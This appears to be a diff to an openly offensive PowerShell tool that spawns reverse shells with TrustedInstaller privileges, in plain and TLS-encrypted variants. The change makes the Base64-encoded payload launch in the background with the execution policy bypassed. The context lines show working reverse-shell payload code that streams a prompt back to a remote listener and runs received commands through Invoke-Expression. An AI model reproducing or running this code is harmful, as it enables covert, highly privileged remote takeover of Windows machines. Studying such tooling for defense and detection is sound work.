@@ -42,7 +42,7 @@ function Invoke-TIRevShell {
     $shell += ' + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
     $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
-    powershell -ep bypass -e $encoded
+    & powershell -ep bypass -e $encoded &
 }
 
 # Spawns a TLS-encrypted Base64 reverse shell with TI privileges using 'powershell -ep bypass -e'
@@ -73,5 +73,5 @@ function Invoke-TIRevShellTLS {
     $shell += ';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'
 
     $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
-    powershell -ep bypass -e $encoded
+    & powershell -ep bypass -e $encoded &
 }
